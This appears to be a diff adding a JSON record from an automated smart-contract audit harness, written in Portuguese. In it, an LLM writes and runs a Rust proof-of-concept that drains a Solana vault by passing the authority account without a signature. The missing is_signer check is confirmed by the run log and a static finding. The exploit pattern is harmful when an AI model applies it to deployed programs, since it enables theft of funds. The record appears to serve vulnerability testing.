@@ -1,0 +1,140 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: vault perdeu lamports sem assinatura da autoridade; recipient ganhou lamports sem assinatura da autoridade",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2610,
+        "completion_tokens": 777,
+        "latency_s": 4.14
+      },
+      "raw": "{\n  \"plan\": \"Preparo um vault com dados contendo a autoridade armazenada (chave pública conhecida) e saldo de 1000 lamports, e uma conta recipient do atacante. O baseline chama withdraw com a autoridade assinando, provando que o cenário está correto. O ataque repete a mesma chamada, mas sem a assinatura da autoridade, passando a conta da autoridade apenas como readonly. O efeito mede se os lamports do vault diminuíram e os do recipient aumentaram, demonstrando o saque não autorizado.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\nlet vault = Pubkey::new_unique();\\n\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\n\\nlet vault_account = account(&env.program_id, &vault_data, Some(2000));\\nlet authority_account = wallet(0);\\nlet recipient_account = wallet(0);\\n\\nlet amount: u64 = 500;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(vault, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet ix = env.raw_ix(&ix_data, metas);\\n\\nlet contas = vec![\\n    (vault, vault_account.clone()),\\n    (authority, authority_account.clone()),\\n    (recipient, recipient_account.clone()),\\n];\\n\\nlet r = env.baseline(\\\"withdraw legitimo com assinatura da autoridade\\\", &ix, &contas);\\n\\nlet vault_after_baseline = after(&r, &vault).clone();\\nlet recipient_after_baseline = after(&r, &recipient).clone();\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(vault, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new(recipient, false),\\n];\\nlet ix_ataque = env.raw_ix(&ix_data, metas_ataque);\\n\\nlet contas_ataque = vec![\\n    (vault, vault_after_baseline),\\n    (authority, authority_account),\\n    (recipient, recipient_after_baseline),\\n];\\n\\nlet r_ataque = env.attack(\\\"withdraw sem assinatura da autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let vault_final = after(&r_ataque, &vault);\\n    let recipient_final = after(&r_ataque, &recipient);\\n    env.effect(\\\"vault perdeu lamports sem assinatura da autoridade\\\", vault_final.lamports() < 2000 - amount);\\n    env.effect(\\\"recipient ganhou lamports sem assinatura da autoridade\\\", recipient_final.lamports() > 0);\\n}\"\n}",
+      "plan": "Preparo um vault com dados contendo a autoridade armazenada (chave pública conhecida) e saldo de 1000 lamports, e uma conta recipient do atacante. O baseline chama withdraw com a autoridade assinando, provando que o cenário está correto. O ataque repete a mesma chamada, mas sem a assinatura da autoridade, passando a conta da autoridade apenas como readonly. O efeito mede se os lamports do vault diminuíram e os do recipient aumentaram, demonstrando o saque não autorizado.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\nlet vault = Pubkey::new_unique();\n\nlet mut vault_data = vec![0u8; 48];\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\n\nlet vault_account = account(&env.program_id, &vault_data, Some(2000));\nlet authority_account = wallet(0);\nlet recipient_account = wallet(0);\n\nlet amount: u64 = 500;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(vault, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet ix = env.raw_ix(&ix_data, metas);\n\nlet contas = vec![\n    (vault, vault_account.clone()),\n    (authority, authority_account.clone()),\n    (recipient, recipient_account.clone()),\n];\n\nlet r = env.baseline(\"withdraw legitimo com assinatura da autoridade\", &ix, &contas);\n\nlet vault_after_baseline = after(&r, &vault).clone();\nlet recipient_after_baseline = after(&r, &recipient).clone();\n\nlet metas_ataque = vec![\n    AccountMeta::new(vault, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new(recipient, false),\n];\nlet ix_ataque = env.raw_ix(&ix_data, metas_ataque);\n\nlet contas_ataque = vec![\n    (vault, vault_after_baseline),\n    (authority, authority_account),\n    (recipient, recipient_after_baseline),\n];\n\nlet r_ataque = env.attack(\"withdraw sem assinatura da autoridade\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let vault_final = after(&r_ataque, &vault);\n    let recipient_final = after(&r_ataque, &recipient);\n    env.effect(\"vault perdeu lamports sem assinatura da autoridade\", vault_final.lamports() < 2000 - amount);\n    env.effect(\"recipient ganhou lamports sem assinatura da autoridade\", recipient_final.lamports() > 0);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo com assinatura da autoridade",
+            "result": "Success",
+            "compute_units": 388,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "00f4010000000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0000000000000000",
+                "digest": "c5e089b14d916741",
+                "post": "00000000000000000000000000000002000000000000000000000000000000000000000000000000f401000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "withdraw sem assinatura da autoridade",
+            "result": "Success",
+            "compute_units": 388,
+            "account_flags": "-w,-r,-w",
+            "ix_head": "00f4010000000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0000000000000000",
+                "digest": "d56efab5738bf488",
+                "post": "000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "vault perdeu lamports sem assinatura da autoridade",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "recipient ganhou lamports sem assinatura da autoridade",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 388 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 388 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: vault perdeu lamports sem assinatura da autoridade; recipient ganhou lamports sem assinatura da autoridade"
+    }
+  ],
+  "case_id": "SSP-01-P-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let authority = &accounts[1];\n...\nif stored_authority != *authority.key() {\n    return Err(ProgramError::Custom(ERR_INVALID_AUTHORITY));\n}",
+    "explanation": "A instrucao valida apenas que a chave publica da conta `authority` coincide com a autoridade armazenada no vault, mas nunca verifica `authority.is_signer`. Sem essa checagem, qualquer pessoa pode passar a conta da autoridade (cuja chave publica e publica) sem assinar a transacao e autorizar o saque.",
+    "attack_hypothesis": "Um atacante fornece a conta da autoridade legitima (chave publica conhecida) como `accounts[1]` sem assina-la, e uma conta `recipient` propria como `accounts[2]`, drenando os lamports do vault para si."
+  }
+}
